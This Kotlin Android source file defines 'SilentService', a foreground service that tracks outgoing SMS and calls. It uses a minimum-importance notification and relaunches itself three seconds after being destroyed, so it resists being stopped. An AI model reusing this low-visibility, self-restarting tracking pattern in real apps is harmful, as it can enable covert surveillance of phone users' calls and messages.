package com.example.calltrackinh

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import android.content.pm.ServiceInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SilentService : Service() {
    private lateinit var smsReceiver: SmsReceiver
    private val serviceScope = CoroutineScope(Dispatchers.Main)

    override fun onCreate() {
        super.onCreate()
        Log.d("SilentService", "Service started main service-------------")
        createNotificationChannel()

        try {
            // Start the service in the foreground
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // For Android 10 and above, we specify the type of service
                val notification = createMinimalNotification()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // API 33 and above
                    val foregroundServiceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    startForeground(1, notification, foregroundServiceType)
                } else {
                    startForeground(1, notification)
                }
            } else {
                // For older Android versions
                startForeground(1, createMinimalNotification())
            }
        } catch (e: Exception) {}
        smsReceiver = SmsReceiver()
        smsReceiver.startOutgoingSmsTracking(this)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        // Add any background task handling (call/SMS tracking) here
        return START_STICKY // Service will restart if killed
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("SilentService", "Service destroyed")

//            try {
//                val serviceIntent = Intent(this, SilentService::class.java)
//                stopService(serviceIntent)
//            } catch (e: Exception) {}
//
           val serviceIntent = Intent(this, SilentService::class.java)
                serviceScope.launch {
                    delay(3000) // Delay for 3 seconds
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(serviceIntent)
                        } else {
                            startService(serviceIntent)
                        }
                        Log.d("SilentService", "Service destroyed --- start service")
                    } catch (e: Exception) {}
                }


    }


    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "CS",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createMinimalNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.noti) // Use a valid icon here
            .setContentTitle("Tracking Calls and Messages")
            .setContentText("Tracking calls and messages in the background.")
            .setOngoing(true)
            .build()
    }

    companion object {
        private const val CHANNEL_ID = "CallAndSmsServiceChannel"
    }
}
